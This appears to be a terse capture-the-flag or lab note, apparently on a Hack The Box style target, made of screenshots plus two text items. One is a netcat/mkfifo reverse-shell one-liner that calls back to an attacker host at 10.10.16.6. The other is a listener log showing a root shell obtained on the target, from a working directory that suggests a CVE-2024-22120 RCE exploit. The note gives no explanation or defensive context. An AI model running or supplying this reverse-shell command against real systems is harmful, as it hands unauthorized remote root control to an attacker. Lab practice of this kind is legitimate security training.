![Pasted image 20260328154330.png](/ob/Pasted%20image%2020260328154330.png)

![Pasted image 20260328154401.png](/ob/Pasted%20image%2020260328154401.png)

![Pasted image 20260328154443.png](/ob/Pasted%20image%2020260328154443.png)

![Pasted image 20260328154526.png](/ob/Pasted%20image%2020260328154526.png)

![Pasted image 20260328154829.png](/ob/Pasted%20image%2020260328154829.png)

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.6 1234 >/tmp/f

![Pasted image 20260328155124.png](/ob/Pasted%20image%2020260328155124.png)

```
➜  CVE-2024-22120-RCE git:(main) ✗ sudo nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.6] from (UNKNOWN) [10.129.234.163] 45114
sh: 0: can't access tty; job control turned off
# whoami 
root
#    
```
